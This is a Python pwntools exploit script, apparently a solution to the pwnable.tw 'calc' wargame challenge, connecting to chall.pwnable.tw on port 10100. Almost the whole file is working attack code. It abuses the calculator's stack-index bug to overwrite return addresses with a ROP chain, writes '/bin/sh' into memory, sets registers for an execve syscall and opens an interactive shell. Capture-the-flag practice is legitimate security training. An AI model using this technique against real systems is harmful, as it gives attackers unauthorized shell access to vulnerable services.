#! /usr/bin/env python
from pwn import *
import sys


# Return address is 0x804967a
context.terminal = ['tmux', 'splitw', '-h']
context(arch="i386", log_level="error")
context.kernel = "i386"
p = remote("chall.pwnable.tw", 10100)
#p = process("./calc")
elf = ELF("./calc")
rop = ROP("./calc")
_open = elf.symbols["open"]
_read = elf.symbols["read"]
_write = elf.symbols["write"]
_mprotect = elf.symbols["mprotect"]
_calc = elf.symbols["calc"]
print(hex(_open))


if "-d" in sys.argv:
    gdb.attach(p,'')

p.recvuntil(b"=== Welcome to SECPROG calculator ===\n")

def list_stack():
    for i in range(400):
        p1 = "00-" + str(i)
        p.sendline(p1)
        x = p.recvline()
        try:
            print(hex(int(x,10)))
        except:
            continue

def sendval(p, i, val):
    p1 = "00+" + str(360+(i)) + "+" + str(val)
    p.sendline(p1)
    p.recvline()

rop.call("read", [0, 0x80eb000, 8])

# Location in memory to put "/bin/sh\x00"
sh = 0x80eb500


# First hurdle of putting "/bin/sh\x00" in memory
p1 = "00+360+" + str(_read)
p.sendline(p1)
p.recvline()
p1 = "00+362-" + str(0x080ec200-_calc)
p.sendline(p1)
p.recvline()
p1 = "00+363-" + str(0xa2e87)
p.sendline(p1)
p.recvline()
p1 = "00+364+" + str(0x80eb000-665991)
p.sendline(p1)
p.recvline()
p1 = "00+365-" + str(0x8048291+1000-8)
p.sendline(p1)
p.recvline()
p.sendline()
p.send("/bin/sh\x00")

# Now to ROP chain the whole thing
p_eax_r = 0x805c34b
#p_ebx_r = 0x80bf782
p_ecx_ebx_r = 0x80701d1

p1 = "00+360+" + str(p_eax_r)
p.sendline(p1)
p.recvline()
p1 = "00+362-" + str(sh-0xb)
p.sendline(p1)
p.recvline()
p1 = "00+363-" + str(0x80eb4f5-p_ecx_ebx_r)
p.sendline(p1)
p.recvline()
p1 = "00+364-" + str(0x7b324)
p.sendline(p1)
p.recvline()
p1 = "00+365+" + str(sh - 0x7b324)
p.sendline(p1)
p.recvline()
p1 = "00+366+" + str(0x80d8ae3 -0x80701db-1)
p.sendline(p1)
p.recvline()





p.sendline()
p.interactive()
